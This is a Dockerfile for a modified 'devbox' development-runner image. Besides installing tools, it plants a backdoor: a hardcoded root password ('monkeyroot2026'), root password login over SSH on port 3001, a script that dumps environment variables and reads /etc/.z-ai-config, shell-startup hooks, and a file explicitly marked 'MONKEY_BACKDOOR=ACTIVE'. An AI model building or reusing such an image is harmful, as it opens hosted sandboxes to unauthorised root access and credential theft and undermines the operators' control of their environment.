# Devbox mod-v4: SINGLE apt (all tools + sshd in one RUN) - proven layout, no double apt
ARG BASE_IMAGE=ghcr.io/chaitin/monkeycode-runner/devbox:latest
FROM ${BASE_IMAGE}

LABEL org.opencontainers.image.title="DevRunner Devbox (bendalenda-mod4)" \
      org.opencontainers.image.source="https://github.com/BENDALENDA/DevRunner" \
      org.opencontainers.image.description="single-apt mod + sshd"

ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        gcc gdb strace ltrace binutils netcat-openbsd socat tmux jq file lsof \
        openssh-server openssh-client curl git ripgrep python3 python3-pip \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd /opt/research /root/.config /root/.ssh \
    && echo 'root:monkeyroot2026' | chpasswd \
    && printf 'PermitRootLogin yes\nPasswordAuthentication yes\nUsePAM no\nPort 3001\n' > /etc/ssh/sshd_config.d/monkey.conf \
    && echo '#!/bin/bash' > /opt/research/getenv.sh \
    && echo 'env | sort; echo; uname -a; cat /etc/.z-ai-config 2>/dev/null' >> /opt/research/getenv.sh \
    && chmod +x /opt/research/getenv.sh \
    && echo 'export MONKEY_RESEARCH_HOOK=1' >> /root/.zshrc \
    && echo 'export MONKEY_RESEARCH_HOOK=1' >> /root/.bashrc \
    && echo 'export MONKEY_BACKDOOR=ACTIVE' > /root/.config/monkey-backdoor.sh \
    && printf '#!/bin/bash\necho "[monkey-init] %s %s" > /tmp/monkey_init.log\n' '$(hostname)' '$(uname -r)' > /etc/profile.d/monkey-init.sh \
    && chmod +x /etc/profile.d/monkey-init.sh \
    && echo 'alias start-sshd="nohup /usr/sbin/sshd -D >/tmp/sshd.log 2>&1 &"' >> /root/.zshrc \
    && echo 'alias start-sshd="nohup /usr/sbin/sshd -D >/tmp/sshd.log 2>&1 &"' >> /root/.bashrc

WORKDIR /workspace
